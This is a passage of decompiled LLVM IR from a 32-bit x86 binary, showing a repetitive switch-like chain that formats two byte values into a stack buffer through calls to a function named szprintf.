dec_label_pc_804aaec:                             ; preds = %dec_label_pc_804aabc, %dec_label_pc_804aac2
  %v12_804aaec = icmp eq i32 %v11_8049ca7, 76
  %v1_804aaf0 = icmp eq i1 %v12_804aaec, false
  br i1 %v1_804aaf0, label %dec_label_pc_804ab1c, label %dec_label_pc_804aaf2

dec_label_pc_804aaf2:                             ; preds = %dec_label_pc_804aaec
  %v0_804aaf2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aaf2 = zext i8 %v0_804aaf2 to i32
  store i32 %v1_804aaf2, i32* @edx, align 4
  %v0_804aafe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aafe = zext i8 %v0_804aafe to i32
  %v2_804ab0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0d, i32* @ebx, align 4
  %v5_804ab14 = call i32 @szprintf(i32 %v2_804ab0d, i32 ptrtoint ([15 x i8]* @global_var_8057e66.115 to i32), i32 %v1_804aafe, i32 %v1_804aaf2)
  br label %dec_label_pc_804ab1c

dec_label_pc_804ab1c:                             ; preds = %dec_label_pc_804aaec, %dec_label_pc_804aaf2
  %v12_804ab1c = icmp eq i32 %v11_8049ca7, 77
  %v1_804ab20 = icmp eq i1 %v12_804ab1c, false
  br i1 %v1_804ab20, label %dec_label_pc_804ab4c, label %dec_label_pc_804ab22

dec_label_pc_804ab22:                             ; preds = %dec_label_pc_804ab1c
  %v0_804ab22 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ab22 = zext i8 %v0_804ab22 to i32
  store i32 %v1_804ab22, i32* @edx, align 4
  %v0_804ab2e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ab2e = zext i8 %v0_804ab2e to i32
  %v2_804ab3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab3d, i32* @ebx, align 4
  %v5_804ab44 = call i32 @szprintf(i32 %v2_804ab3d, i32 ptrtoint ([14 x i8]* @global_var_8057e75.116 to i32), i32 %v1_804ab2e, i32 %v1_804ab22)
  br label %dec_label_pc_804ab4c

dec_label_pc_804ab4c:                             ; preds = %dec_label_pc_804ab1c, %dec_label_pc_804ab22
  %v12_804ab4c = icmp eq i32 %v11_8049ca7, 78
  %v1_804ab50 = icmp eq i1 %v12_804ab4c, false
  br i1 %v1_804ab50, label %dec_label_pc_804ab7c, label %dec_label_pc_804ab52

dec_label_pc_804ab52:                             ; preds = %dec_label_pc_804ab4c
  %v0_804ab52 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ab52 = zext i8 %v0_804ab52 to i32
  store i32 %v1_804ab52, i32* @edx, align 4
  %v0_804ab5e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ab5e = zext i8 %v0_804ab5e to i32
  %v2_804ab6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab6d, i32* @ebx, align 4
  %v5_804ab74 = call i32 @szprintf(i32 %v2_804ab6d, i32 ptrtoint ([14 x i8]* @global_var_8057e83.117 to i32), i32 %v1_804ab5e, i32 %v1_804ab52)
  br label %dec_label_pc_804ab7c

dec_label_pc_804ab7c:                             ; preds = %dec_label_pc_804ab4c, %dec_label_pc_804ab52
  %v12_804ab7c = icmp eq i32 %v11_8049ca7, 79
  %v1_804ab80 = icmp eq i1 %v12_804ab7c, false
  br i1 %v1_804ab80, label %dec_label_pc_804abac, label %dec_label_pc_804ab82

dec_label_pc_804ab82:                             ; preds = %dec_label_pc_804ab7c
  %v0_804ab82 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ab82 = zext i8 %v0_804ab82 to i32
  store i32 %v1_804ab82, i32* @edx, align 4
  %v0_804ab8e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ab8e = zext i8 %v0_804ab8e to i32
  %v2_804ab9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab9d, i32* @ebx, align 4
  %v5_804aba4 = call i32 @szprintf(i32 %v2_804ab9d, i32 ptrtoint ([16 x i8]* @global_var_8057e91.118 to i32), i32 %v1_804ab8e, i32 %v1_804ab82)
  br label %dec_label_pc_804abac

dec_label_pc_804abac:                             ; preds = %dec_label_pc_804ab7c, %dec_label_pc_804ab82
  %v9_804abac = icmp eq i32 %v11_8049ca7, 80
  %v1_804abb0 = icmp eq i1 %v9_804abac, false
  br i1 %v1_804abb0, label %dec_label_pc_804abdc, label %dec_label_pc_804abb2

dec_label_pc_804abb2:                             ; preds = %dec_label_pc_804abac
  %v0_804abb2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804abb2 = zext i8 %v0_804abb2 to i32
  store i32 %v1_804abb2, i32* @edx, align 4
  %v0_804abbe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804abbe = zext i8 %v0_804abbe to i32
  %v2_804abcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abcd, i32* @ebx, align 4
  %v5_804abd4 = call i32 @szprintf(i32 %v2_804abcd, i32 ptrtoint ([14 x i8]* @global_var_8057ea1.119 to i32), i32 %v1_804abbe, i32 %v1_804abb2)
  br label %dec_label_pc_804abdc

dec_label_pc_804abdc:                             ; preds = %dec_label_pc_804abac, %dec_label_pc_804abb2
  %v12_804abdc = icmp eq i32 %v11_8049ca7, 81
  %v1_804abe0 = icmp eq i1 %v12_804abdc, false
  br i1 %v1_804abe0, label %dec_label_pc_804ac0c, label %dec_label_pc_804abe2

dec_label_pc_804abe2:                             ; preds = %dec_label_pc_804abdc
  %v0_804abe2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804abe2 = zext i8 %v0_804abe2 to i32
  store i32 %v1_804abe2, i32* @edx, align 4
  %v0_804abee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804abee = zext i8 %v0_804abee to i32
  %v2_804abfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abfd, i32* @ebx, align 4
  %v5_804ac04 = call i32 @szprintf(i32 %v2_804abfd, i32 ptrtoint ([14 x i8]* @global_var_8057eaf.120 to i32), i32 %v1_804abee, i32 %v1_804abe2)
  br label %dec_label_pc_804ac0c

dec_label_pc_804ac0c:                             ; preds = %dec_label_pc_804abdc, %dec_label_pc_804abe2
  %v12_804ac0c = icmp eq i32 %v11_8049ca7, 82
  %v1_804ac10 = icmp eq i1 %v12_804ac0c, false
  br i1 %v1_804ac10, label %dec_label_pc_804ac3c, label %dec_label_pc_804ac12

dec_label_pc_804ac12:                             ; preds = %dec_label_pc_804ac0c
  %v0_804ac12 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ac12 = zext i8 %v0_804ac12 to i32
  store i32 %v1_804ac12, i32* @edx, align 4
  %v0_804ac1e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ac1e = zext i8 %v0_804ac1e to i32
  %v2_804ac2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac2d, i32* @ebx, align 4
  %v5_804ac34 = call i32 @szprintf(i32 %v2_804ac2d, i32 ptrtoint ([14 x i8]* @global_var_8057ebd.121 to i32), i32 %v1_804ac1e, i32 %v1_804ac12)
  br label %dec_label_pc_804ac3c

dec_label_pc_804ac3c:                             ; preds = %dec_label_pc_804ac0c, %dec_label_pc_804ac12
  %v12_804ac3c = icmp eq i32 %v11_8049ca7, 83
  %v1_804ac40 = icmp eq i1 %v12_804ac3c, false
  br i1 %v1_804ac40, label %dec_label_pc_804ac6c, label %dec_label_pc_804ac42

dec_label_pc_804ac42:                             ; preds = %dec_label_pc_804ac3c
  %v0_804ac42 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ac42 = zext i8 %v0_804ac42 to i32
  store i32 %v1_804ac42, i32* @edx, align 4
  %v0_804ac4e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ac4e = zext i8 %v0_804ac4e to i32
  %v2_804ac5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac5d, i32* @ebx, align 4
  %v5_804ac64 = call i32 @szprintf(i32 %v2_804ac5d, i32 ptrtoint ([15 x i8]* @global_var_8057ecb.122 to i32), i32 %v1_804ac4e, i32 %v1_804ac42)
  br label %dec_label_pc_804ac6c

dec_label_pc_804ac6c:                             ; preds = %dec_label_pc_804ac3c, %dec_label_pc_804ac42
  %v12_804ac6c = icmp eq i32 %v11_8049ca7, 84
  %v1_804ac70 = icmp eq i1 %v12_804ac6c, false
  br i1 %v1_804ac70, label %dec_label_pc_804ac9c, label %dec_label_pc_804ac72

dec_label_pc_804ac72:                             ; preds = %dec_label_pc_804ac6c
  %v0_804ac72 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ac72 = zext i8 %v0_804ac72 to i32
  store i32 %v1_804ac72, i32* @edx, align 4
  %v0_804ac7e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ac7e = zext i8 %v0_804ac7e to i32
  %v2_804ac8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8d, i32* @ebx, align 4
  %v5_804ac94 = call i32 @szprintf(i32 %v2_804ac8d, i32 ptrtoint ([14 x i8]* @global_var_8057eda.123 to i32), i32 %v1_804ac7e, i32 %v1_804ac72)
  br label %dec_label_pc_804ac9c

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac6c, %dec_label_pc_804ac72
  %v12_804ac9c = icmp eq i32 %v11_8049ca7, 85
  %v1_804aca0 = icmp eq i1 %v12_804ac9c, false
  br i1 %v1_804aca0, label %dec_label_pc_804accc, label %dec_label_pc_804aca2

dec_label_pc_804aca2:                             ; preds = %dec_label_pc_804ac9c
  %v0_804aca2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aca2 = zext i8 %v0_804aca2 to i32
  store i32 %v1_804aca2, i32* @edx, align 4
  %v0_804acae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804acae = zext i8 %v0_804acae to i32
  %v2_804acbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acbd, i32* @ebx, align 4
  %v5_804acc4 = call i32 @szprintf(i32 %v2_804acbd, i32 ptrtoint ([14 x i8]* @global_var_8057ee8.124 to i32), i32 %v1_804acae, i32 %v1_804aca2)
  br label %dec_label_pc_804accc

dec_label_pc_804accc:                             ; preds = %dec_label_pc_804ac9c, %dec_label_pc_804aca2
  %v12_804accc = icmp eq i32 %v11_8049ca7, 86
  %v1_804acd0 = icmp eq i1 %v12_804accc, false
  br i1 %v1_804acd0, label %dec_label_pc_804acfc, label %dec_label_pc_804acd2

dec_label_pc_804acd2:                             ; preds = %dec_label_pc_804accc
  %v0_804acd2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804acd2 = zext i8 %v0_804acd2 to i32
  store i32 %v1_804acd2, i32* @edx, align 4
  %v0_804acde = load i8, i8* @global_var_805b559.40, align 1
  %v1_804acde = zext i8 %v0_804acde to i32
  %v2_804aced = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aced, i32* @ebx, align 4
  %v5_804acf4 = call i32 @szprintf(i32 %v2_804aced, i32 ptrtoint ([14 x i8]* @global_var_8057ef6.125 to i32), i32 %v1_804acde, i32 %v1_804acd2)
  br label %dec_label_pc_804acfc

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804accc, %dec_label_pc_804acd2
  %v12_804acfc = icmp eq i32 %v11_8049ca7, 87
  %v1_804ad00 = icmp eq i1 %v12_804acfc, false
  br i1 %v1_804ad00, label %dec_label_pc_804ad2c, label %dec_label_pc_804ad02

dec_label_pc_804ad02:                             ; preds = %dec_label_pc_804acfc
  %v0_804ad02 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad02 = zext i8 %v0_804ad02 to i32
  store i32 %v1_804ad02, i32* @edx, align 4
  %v0_804ad0e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad0e = zext i8 %v0_804ad0e to i32
  %v2_804ad1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad1d, i32* @ebx, align 4
  %v5_804ad24 = call i32 @szprintf(i32 %v2_804ad1d, i32 ptrtoint ([14 x i8]* @global_var_8057f04.126 to i32), i32 %v1_804ad0e, i32 %v1_804ad02)
  br label %dec_label_pc_804ad2c

dec_label_pc_804ad2c:                             ; preds = %dec_label_pc_804acfc, %dec_label_pc_804ad02
  %v12_804ad2c = icmp eq i32 %v11_8049ca7, 88
  %v1_804ad30 = icmp eq i1 %v12_804ad2c, false
  br i1 %v1_804ad30, label %dec_label_pc_804ad5c, label %dec_label_pc_804ad32

dec_label_pc_804ad32:                             ; preds = %dec_label_pc_804ad2c
  %v0_804ad32 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad32 = zext i8 %v0_804ad32 to i32
  store i32 %v1_804ad32, i32* @edx, align 4
  %v0_804ad3e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad3e = zext i8 %v0_804ad3e to i32
  %v2_804ad4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad4d, i32* @ebx, align 4
  %v5_804ad54 = call i32 @szprintf(i32 %v2_804ad4d, i32 ptrtoint ([14 x i8]* @global_var_8057f12.127 to i32), i32 %v1_804ad3e, i32 %v1_804ad32)
  br label %dec_label_pc_804ad5c

dec_label_pc_804ad5c:                             ; preds = %dec_label_pc_804ad2c, %dec_label_pc_804ad32
  %v12_804ad5c = icmp eq i32 %v11_8049ca7, 89
  %v1_804ad60 = icmp eq i1 %v12_804ad5c, false
  br i1 %v1_804ad60, label %dec_label_pc_804ad8c, label %dec_label_pc_804ad62

dec_label_pc_804ad62:                             ; preds = %dec_label_pc_804ad5c
  %v0_804ad62 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad62 = zext i8 %v0_804ad62 to i32
  store i32 %v1_804ad62, i32* @edx, align 4
  %v0_804ad6e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad6e = zext i8 %v0_804ad6e to i32
  %v2_804ad7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad7d, i32* @ebx, align 4
  %v5_804ad84 = call i32 @szprintf(i32 %v2_804ad7d, i32 ptrtoint ([14 x i8]* @global_var_8057f20.128 to i32), i32 %v1_804ad6e, i32 %v1_804ad62)
  br label %dec_label_pc_804ad8c

dec_label_pc_804ad8c:                             ; preds = %dec_label_pc_804ad5c, %dec_label_pc_804ad62
  %v12_804ad8c = icmp eq i32 %v11_8049ca7, 90
  %v1_804ad90 = icmp eq i1 %v12_804ad8c, false
  br i1 %v1_804ad90, label %dec_label_pc_804adbc, label %dec_label_pc_804ad92

dec_label_pc_804ad92:                             ; preds = %dec_label_pc_804ad8c
  %v0_804ad92 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad92 = zext i8 %v0_804ad92 to i32
  store i32 %v1_804ad92, i32* @edx, align 4
  %v0_804ad9e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad9e = zext i8 %v0_804ad9e to i32
  %v2_804adad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adad, i32* @ebx, align 4
  %v5_804adb4 = call i32 @szprintf(i32 %v2_804adad, i32 ptrtoint ([13 x i8]* @global_var_8057f2e.129 to i32), i32 %v1_804ad9e, i32 %v1_804ad92)
  br label %dec_label_pc_804adbc

dec_label_pc_804adbc:                             ; preds = %dec_label_pc_804ad8c, %dec_label_pc_804ad92
  %v12_804adbc = icmp eq i32 %v11_8049ca7, 91
  %v1_804adc0 = icmp eq i1 %v12_804adbc, false
  br i1 %v1_804adc0, label %dec_label_pc_804adec, label %dec_label_pc_804adc2

dec_label_pc_804adc2:                             ; preds = %dec_label_pc_804adbc
  %v0_804adc2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804adc2 = zext i8 %v0_804adc2 to i32
  store i32 %v1_804adc2, i32* @edx, align 4
  %v0_804adce = load i8, i8* @global_var_805b559.40, align 1
  %v1_804adce = zext i8 %v0_804adce to i32
  %v2_804addd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804addd, i32* @ebx, align 4
  %v5_804ade4 = call i32 @szprintf(i32 %v2_804addd, i32 ptrtoint ([13 x i8]* @global_var_8057f3b.130 to i32), i32 %v1_804adce, i32 %v1_804adc2)
  br label %dec_label_pc_804adec

dec_label_pc_804adec:                             ; preds = %dec_label_pc_804adbc, %dec_label_pc_804adc2
  %v12_804adec = icmp eq i32 %v11_8049ca7, 92
  %v1_804adf0 = icmp eq i1 %v12_804adec, false
  br i1 %v1_804adf0, label %dec_label_pc_804ae1c, label %dec_label_pc_804adf2

dec_label_pc_804adf2:                             ; preds = %dec_label_pc_804adec
  %v0_804adf2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804adf2 = zext i8 %v0_804adf2 to i32
  store i32 %v1_804adf2, i32* @edx, align 4
  %v0_804adfe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804adfe = zext i8 %v0_804adfe to i32
  %v2_804ae0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae0d, i32* @ebx, align 4
  %v5_804ae14 = call i32 @szprintf(i32 %v2_804ae0d, i32 ptrtoint ([13 x i8]* @global_var_8057f48.131 to i32), i32 %v1_804adfe, i32 %v1_804adf2)
  br label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804adec, %dec_label_pc_804adf2
  %v12_804ae1c = icmp eq i32 %v11_8049ca7, 93
  %v1_804ae20 = icmp eq i1 %v12_804ae1c, false
  br i1 %v1_804ae20, label %dec_label_pc_804ae4c, label %dec_label_pc_804ae22

dec_label_pc_804ae22:                             ; preds = %dec_label_pc_804ae1c
  %v0_804ae22 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ae22 = zext i8 %v0_804ae22 to i32
  store i32 %v1_804ae22, i32* @edx, align 4
  %v0_804ae2e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ae2e = zext i8 %v0_804ae2e to i32
  %v2_804ae3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3d, i32* @ebx, align 4
  %v5_804ae44 = call i32 @szprintf(i32 %v2_804ae3d, i32 ptrtoint ([13 x i8]* @global_var_8057f55.132 to i32), i32 %v1_804ae2e, i32 %v1_804ae22)
  br label %dec_label_pc_804ae4c

dec_label_pc_804ae4c:                             ; preds = %dec_label_pc_804ae1c, %dec_label_pc_804ae22
  %v12_804ae4c = icmp eq i32 %v11_8049ca7, 94
  %v1_804ae50 = icmp eq i1 %v12_804ae4c, false
  br i1 %v1_804ae50, label %dec_label_pc_804ae7c, label %dec_label_pc_804ae52

dec_label_pc_804ae52:                             ; preds = %dec_label_pc_804ae4c
  %v0_804ae52 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ae52 = zext i8 %v0_804ae52 to i32
  store i32 %v1_804ae52, i32* @edx, align 4
  %v0_804ae5e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ae5e = zext i8 %v0_804ae5e to i32
  %v2_804ae6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6d, i32* @ebx, align 4
  %v5_804ae74 = call i32 @szprintf(i32 %v2_804ae6d, i32 ptrtoint ([13 x i8]* @global_var_8057cae.83 to i32), i32 %v1_804ae5e, i32 %v1_804ae52)
  br label %dec_label_pc_804ae7c

dec_label_pc_804ae7c:                             ; preds = %dec_label_pc_804ae4c, %dec_label_pc_804ae52
  %v12_804ae7c = icmp eq i32 %v11_8049ca7, 95
  %v1_804ae80 = icmp eq i1 %v12_804ae7c, false
  br i1 %v1_804ae80, label %dec_label_pc_804aeac, label %dec_label_pc_804ae82

dec_label_pc_804ae82:                             ; preds = %dec_label_pc_804ae7c
  %v0_804ae82 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ae82 = zext i8 %v0_804ae82 to i32
  store i32 %v1_804ae82, i32* @edx, align 4
  %v0_804ae8e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ae8e = zext i8 %v0_804ae8e to i32
  %v2_804ae9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae9d, i32* @ebx, align 4
  %v5_804aea4 = call i32 @szprintf(i32 %v2_804ae9d, i32 ptrtoint ([13 x i8]* @global_var_8057f62.133 to i32), i32 %v1_804ae8e, i32 %v1_804ae82)
  br label %dec_label_pc_804aeac

dec_label_pc_804aeac:                             ; preds = %dec_label_pc_804ae7c, %dec_label_pc_804ae82
  %v9_804aeac = icmp eq i32 %v11_8049ca7, 96
  %v1_804aeb0 = icmp eq i1 %v9_804aeac, false
  br i1 %v1_804aeb0, label %dec_label_pc_804aedc, label %dec_label_pc_804aeb2

dec_label_pc_804aeb2:                             ; preds = %dec_label_pc_804aeac
  %v0_804aeb2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aeb2 = zext i8 %v0_804aeb2 to i32
  store i32 %v1_804aeb2, i32* @edx, align 4
  %v0_804aebe = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aebe = zext i8 %v0_804aebe to i32
  %v2_804aecd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aecd, i32* @ebx, align 4
  %v5_804aed4 = call i32 @szprintf(i32 %v2_804aecd, i32 ptrtoint ([13 x i8]* @global_var_8057cd5.86 to i32), i32 %v1_804aebe, i32 %v1_804aeb2)
  br label %dec_label_pc_804aedc

dec_label_pc_804aedc:                             ; preds = %dec_label_pc_804aeac, %dec_label_pc_804aeb2
  %v12_804aedc = icmp eq i32 %v11_8049ca7, 97
  %v1_804aee0 = icmp eq i1 %v12_804aedc, false
  br i1 %v1_804aee0, label %dec_label_pc_804af0c, label %dec_label_pc_804aee2

dec_label_pc_804aee2:                             ; preds = %dec_label_pc_804aedc
  %v0_804aee2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aee2 = zext i8 %v0_804aee2 to i32
  store i32 %v1_804aee2, i32* @edx, align 4
  %v0_804aeee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aeee = zext i8 %v0_804aeee to i32
  %v2_804aefd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aefd, i32* @ebx, align 4
  %v5_804af04 = call i32 @szprintf(i32 %v2_804aefd, i32 ptrtoint ([14 x i8]* @global_var_8057e3c.112 to i32), i32 %v1_804aeee, i32 %v1_804aee2)
  br label %dec_label_pc_804af0c

dec_label_pc_804af0c:                             ; preds = %dec_label_pc_804aedc, %dec_label_pc_804aee2
  %v12_804af0c = icmp eq i32 %v11_8049ca7, 98
  %v1_804af10 = icmp eq i1 %v12_804af0c, false
  br i1 %v1_804af10, label %dec_label_pc_804af3c, label %dec_label_pc_804af12

dec_label_pc_804af12:                             ; preds = %dec_label_pc_804af0c
  %v0_804af12 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804af12 = zext i8 %v0_804af12 to i32
  store i32 %v1_804af12, i32* @edx, align 4
  %v0_804af1e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804af1e = zext i8 %v0_804af1e to i32
  %v2_804af2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af2d, i32* @ebx, align 4
  %v5_804af34 = call i32 @szprintf(i32 %v2_804af2d, i32 ptrtoint ([13 x i8]* @global_var_8057f6f.134 to i32), i32 %v1_804af1e, i32 %v1_804af12)
  br label %dec_label_pc_804af3c

dec_label_pc_804af3c:                             ; preds = %dec_label_pc_804af0c, %dec_label_pc_804af12
  %v12_804af3c = icmp eq i32 %v11_8049ca7, 99
  %v1_804af40 = icmp eq i1 %v12_804af3c, false
  br i1 %v1_804af40, label %dec_label_pc_804af6c, label %dec_label_pc_804af42

dec_label_pc_804af42:                             ; preds = %dec_label_pc_804af3c
  %v0_804af42 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804af42 = zext i8 %v0_804af42 to i32
  store i32 %v1_804af42, i32* @edx, align 4
  %v0_804af4e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804af4e = zext i8 %v0_804af4e to i32
  %v2_804af5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af5d, i32* @ebx, align 4
  %v5_804af64 = call i32 @szprintf(i32 %v2_804af5d, i32 ptrtoint ([14 x i8]* @global_var_8057f7c.135 to i32), i32 %v1_804af4e, i32 %v1_804af42)
  br label %dec_label_pc_804af6c

dec_label_pc_804af6c:                             ; preds = %dec_label_pc_804af3c, %dec_label_pc_804af42
  %v12_804af6c = icmp eq i32 %v11_8049ca7, 100
  %v1_804af70 = icmp eq i1 %v12_804af6c, false
  br i1 %v1_804af70, label %dec_label_pc_804af9c, label %dec_label_pc_804af72

dec_label_pc_804af72:                             ; preds = %dec_label_pc_804af6c
  %v0_804af72 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804af72 = zext i8 %v0_804af72 to i32
  store i32 %v1_804af72, i32* @edx, align 4
  %v0_804af7e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804af7e = zext i8 %v0_804af7e to i32
  %v2_804af8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af8d, i32* @ebx, align 4
  %v5_804af94 = call i32 @szprintf(i32 %v2_804af8d, i32 ptrtoint ([14 x i8]* @global_var_8057f8a.136 to i32), i32 %v1_804af7e, i32 %v1_804af72)
  br label %dec_label_pc_804af9c

dec_label_pc_804af9c:                             ; preds = %dec_label_pc_804af6c, %dec_label_pc_804af72
  %v12_804af9c = icmp eq i32 %v11_8049ca7, 101
  %v1_804afa0 = icmp eq i1 %v12_804af9c, false
  br i1 %v1_804afa0, label %dec_label_pc_804afcc, label %dec_label_pc_804afa2

dec_label_pc_804afa2:                             ; preds = %dec_label_pc_804af9c
  %v0_804afa2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804afa2 = zext i8 %v0_804afa2 to i32
  store i32 %v1_804afa2, i32* @edx, align 4
  %v0_804afae = load i8, i8* @global_var_805b559.40, align 1
  %v1_804afae = zext i8 %v0_804afae to i32
  %v2_804afbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afbd, i32* @ebx, align 4
  %v5_804afc4 = call i32 @szprintf(i32 %v2_804afbd, i32 ptrtoint ([13 x i8]* @global_var_8057f98.137 to i32), i32 %v1_804afae, i32 %v1_804afa2)
  br label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af9c, %dec_label_pc_804afa2
  %v12_804afcc = icmp eq i32 %v11_8049ca7, 102
  %v1_804afd0 = icmp eq i1 %v12_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804affc, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afcc
  %v0_804afd2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804afd2 = zext i8 %v0_804afd2 to i32
  store i32 %v1_804afd2, i32* @edx, align 4
  %v0_804afde = load i8, i8* @global_var_805b559.40, align 1
  %v1_804afde = zext i8 %v0_804afde to i32
  %v2_804afed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afed, i32* @ebx, align 4
  %v5_804aff4 = call i32 @szprintf(i32 %v2_804afed, i32 ptrtoint ([13 x i8]* @global_var_8057fa5.138 to i32), i32 %v1_804afde, i32 %v1_804afd2)
  br label %dec_label_pc_804affc

dec_label_pc_804affc:                             ; preds = %dec_label_pc_804afcc, %dec_label_pc_804afd2
  %v12_804affc = icmp eq i32 %v11_8049ca7, 103
  %v1_804b000 = icmp eq i1 %v12_804affc, false
  br i1 %v1_804b000, label %dec_label_pc_804b02c, label %dec_label_pc_804b002

dec_label_pc_804b002:                             ; preds = %dec_label_pc_804affc
  %v0_804b002 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b002 = zext i8 %v0_804b002 to i32
  store i32 %v1_804b002, i32* @edx, align 4
  %v0_804b00e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b00e = zext i8 %v0_804b00e to i32
  %v2_804b01d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01d, i32* @ebx, align 4
  %v5_804b024 = call i32 @szprintf(i32 %v2_804b01d, i32 ptrtoint ([13 x i8]* @global_var_8057fb2.139 to i32), i32 %v1_804b00e, i32 %v1_804b002)
  br label %dec_label_pc_804b02c

dec_label_pc_804b02c:                             ; preds = %dec_label_pc_804affc, %dec_label_pc_804b002
  %v12_804b02c = icmp eq i32 %v11_8049ca7, 104
  %v1_804b030 = icmp eq i1 %v12_804b02c, false
  br i1 %v1_804b030, label %dec_label_pc_804b05c, label %dec_label_pc_804b032

dec_label_pc_804b032:                             ; preds = %dec_label_pc_804b02c
  %v0_804b032 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b032 = zext i8 %v0_804b032 to i32
  store i32 %v1_804b032, i32* @edx, align 4
  %v0_804b03e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b03e = zext i8 %v0_804b03e to i32
  %v2_804b04d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b04d, i32* @ebx, align 4
  %v5_804b054 = call i32 @szprintf(i32 %v2_804b04d, i32 ptrtoint ([13 x i8]* @global_var_8057fbf.140 to i32), i32 %v1_804b03e, i32 %v1_804b032)
  br label %dec_label_pc_804b05c

dec_label_pc_804b05c:                             ; preds = %dec_label_pc_804b02c, %dec_label_pc_804b032
  %v12_804b05c = icmp eq i32 %v11_8049ca7, 105
  %v1_804b060 = icmp eq i1 %v12_804b05c, false
  br i1 %v1_804b060, label %dec_label_pc_804b08c, label %dec_label_pc_804b062

dec_label_pc_804b062:                             ; preds = %dec_label_pc_804b05c
  %v0_804b062 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b062 = zext i8 %v0_804b062 to i32
  store i32 %v1_804b062, i32* @edx, align 4
  %v0_804b06e = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b06e = zext i8 %v0_804b06e to i32
  %v2_804b07d = ptrtoint i32* %stack_var_-28 to i32
